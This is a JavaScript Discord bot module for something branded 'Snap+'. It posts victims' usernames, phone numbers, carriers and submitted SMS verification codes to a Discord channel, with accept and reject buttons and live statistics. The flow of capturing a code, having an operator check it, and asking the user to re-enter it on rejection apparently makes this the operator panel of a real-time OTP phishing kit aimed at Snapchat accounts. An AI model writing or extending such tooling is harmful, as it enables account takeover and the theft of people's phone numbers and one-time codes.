const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { users } = require('./store');
const { stats } = require('./server');

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const SEPARATOR = '──────────────────────────────────────────────────────';

let statsMessageId = null;
let statsChannelId = null;

// ======================= UTILITAIRES =======================
function formatPhoneNumber(phone) {
  if (!phone) return 'N/A';
  return phone.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
}

function formatUptime(ms) {
  const seconds = Math.floor(ms / 1000);
  const minutes = Math.floor(seconds / 60);
  const hours = Math.floor(minutes / 60);
  const days = Math.floor(hours / 24);

  if (days > 0) return `${days}j ${hours % 24}h ${minutes % 60}m`;
  if (hours > 0) return `${hours}h ${minutes % 60}m`;
  if (minutes > 0) return `${minutes}m ${seconds % 60}s`;
  return `${seconds}s`;
}

function getPercentage(value, total) {
  if (total === 0) return 0;
  return ((value / total) * 100).toFixed(1);
}

// ======================= EMBED STATISTIQUES =======================
function createStatsEmbed() {
  const uptime = formatUptime(Date.now() - stats.startTime);
  const STATS_SEPARATOR = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';

  return new EmbedBuilder()
    .setColor('#5865F2')
    .setTitle('📊 Statistiques en temps réel - Snap+')
    .setDescription(
      `${STATS_SEPARATOR}\n\n` +
      `### 👥 **Visiteurs**\n` +
      `🌐 **Total des visites:** \`${stats.totalVisits}\`\n` +
      `👤 **Visiteurs actuels:** \`${stats.currentVisitors}\`\n` +
      `🕐 **Dernière visite:** ${stats.lastVisit || 'Aucune'}\n\n` +
      
      `### 📝 **Inscriptions**\n` +
      `📱 **Total inscriptions:** \`${stats.totalRegistrations}\`\n` +
      `🕐 **Dernière inscription:** ${stats.lastRegistration || 'Aucune'}\n\n` +
      
      `### 🔐 **Codes de vérification**\n` +
      `📤 **Codes soumis:** \`${stats.totalCodesSubmitted}\`\n` +
      `✅ **Codes acceptés:** \`${stats.codesAccepted}\` (${getPercentage(stats.codesAccepted, stats.totalCodesSubmitted)}%)\n` +
      `❌ **Codes rejetés:** \`${stats.codesRejected}\` (${getPercentage(stats.codesRejected, stats.totalCodesSubmitted)}%)\n\n` +
      
      `### ⏱️ **Système**\n` +
      `🟢 **Uptime:** ${uptime}\n` +
      `🔄 **Dernière mise à jour:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n\n` +
      
      `${STATS_SEPARATOR}`
    )
    .setFooter({ text: '🔄 Actualisation automatique toutes les 30 secondes' })
    .setTimestamp();
}

async function initStatsEmbed() {
  statsChannelId = process.env.STATS_CHANNEL_ID;
  
  if (!statsChannelId) {
    console.warn('⚠️ STATS_CHANNEL_ID non défini dans .env - Stats désactivées');
    return;
  }

  try {
    const channel = await client.channels.fetch(statsChannelId);
    
    // Chercher un message existant
    const messages = await channel.messages.fetch({ limit: 10 });
    const existingStats = messages.find(msg => 
      msg.author.id === client.user.id && 
      msg.embeds[0]?.title?.includes('📊')
    );

    const embed = createStatsEmbed();

    if (existingStats) {
      await existingStats.edit({ embeds: [embed] });
      statsMessageId = existingStats.id;
      console.log('✅ Embed de statistiques mis à jour');
    } else {
      const msg = await channel.send({ embeds: [embed] });
      statsMessageId = msg.id;
      console.log('✅ Embed de statistiques créé');
    }

    // Actualiser toutes les 30 secondes
    setInterval(() => updateStatsMessage(), 30000);
  } catch (err) {
    console.error('❌ Erreur initialisation stats:', err);
  }
}

async function updateStatsMessage() {
  if (!statsMessageId || !statsChannelId) return;

  try {
    const channel = await client.channels.fetch(statsChannelId);
    const message = await channel.messages.fetch(statsMessageId);
    const embed = createStatsEmbed();
    await message.edit({ embeds: [embed] });
  } catch (err) {
    console.error('❌ Erreur mise à jour stats:', err);
  }
}

// Fonction appelée par server.js pour mettre à jour les stats
function updateStats(newStats) {
  // Les stats sont déjà partagées via require('./server')
  // On met juste à jour l'embed Discord
  if (statsMessageId && statsChannelId) {
    updateStatsMessage();
  }
}

// ======================= BOT DISCORD =======================
client.once('ready', () => {
  console.log(`🤖 Bot Discord connecté : ${client.user.tag}`);
  
  // Initialiser l'embed de statistiques
  setTimeout(() => initStatsEmbed(), 2000);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const [action, username] = interaction.customId.split(':');
  const user = users[username];

  if (!user) {
    return interaction.reply({ content: 'Utilisateur introuvable.', ephemeral: true });
  }

  if (action === 'accept') {
    user.status = 'verified';

    const embed = new EmbedBuilder()
      .setColor('#2ecc71')
      .setDescription(
        `# ✅ Code validé\n` +
        `${SEPARATOR}\n` +
        `### 👤 **Nom d'utilisateur:** ${username}\n` +
        `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
        `### 🔢 **Code:** \`${user.submittedCode}\`\n` +
        `### 📅 **Validé à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
        `### ✅ **Validé par:** ${interaction.user.tag}\n` +
        `${SEPARATOR}\n` +
        `*Utilisateur vérifié*`
      );

    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
    
    // Mise à jour des stats
    stats.codesAccepted++;
    updateStats(stats);
  }

  if (action === 'reject') {
    user.status = 'rejected';
    const rejectedCode = user.submittedCode;
    user.submittedCode = null;

    const embed = new EmbedBuilder()
      .setColor('#e74c3c')
      .setDescription(
        `# 🔒 Code rejeté\n` +
        `${SEPARATOR}\n` +
        `### 👤 **Nom d'utilisateur:** ${username}\n` +
        `### 🔢 **Code saisi:** \`${rejectedCode || 'N/A'}\`\n` +
        `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
        `### 📅 **Rejeté à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
        `### ❌ **Rejeté par:** ${interaction.user.tag}\n` +
        `${SEPARATOR}\n` +
        `*L'utilisateur devra ressaisir le code*`
      );

    await interaction.update({ content: '@everyone', embeds: [embed], components: [] });
    
    // Mise à jour des stats
    stats.codesRejected++;
    updateStats(stats);
  }
});

async function sendInitialEmbed(username, phone) {
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);
  const user = users[username];

  const embed = new EmbedBuilder()
    .setColor('#2b2d31')
    .setDescription(
      `# 📱 Nouvelle inscription Snap+\n` +
      `${SEPARATOR}\n` +
      `### 👤 **Nom d'utilisateur:** ${username}\n` +
      `### 📞 **Téléphone:** ${formatPhoneNumber(phone)}\n` +
      `### 🏛️ **Opérateur:** ${user.operator || 'N/A'}\n` +
      `### ⏰ **Date:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
      `${SEPARATOR}\n` +
      `*En attente du code...*`
    );

  await channel.send({ content: '@everyone', embeds: [embed] });
}

async function sendCodeEmbed(username) {
  const user = users[username];
  const channel = await client.channels.fetch(process.env.DISCORD_CHANNEL_ID);

  const embed = new EmbedBuilder()
    .setColor('#f1c40f')
    .setDescription(
      `# 🔒 Code de vérification soumis\n` +
      `${SEPARATOR}\n` +
      `### 👤 **Nom d'utilisateur:** ${username}\n` +
      `### 🔢 **Code saisi:** \`${user.submittedCode}\`\n` +
      `### 📞 **Téléphone:** ${formatPhoneNumber(user.phone)}\n` +
      `### 📅 **Soumis à:** ${new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' })}\n` +
      `${SEPARATOR}\n` +
      `*En attente de validation par un modérateur*`
    );

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`accept:${username}`).setLabel('Accepter').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`reject:${username}`).setLabel('Refuser').setStyle(ButtonStyle.Danger)
  );

  await channel.send({ content: '@everyone', embeds: [embed], components: [row] });
}

client.login(process.env.BOT_TOKEN);

module.exports = { sendInitialEmbed, sendCodeEmbed, updateStats };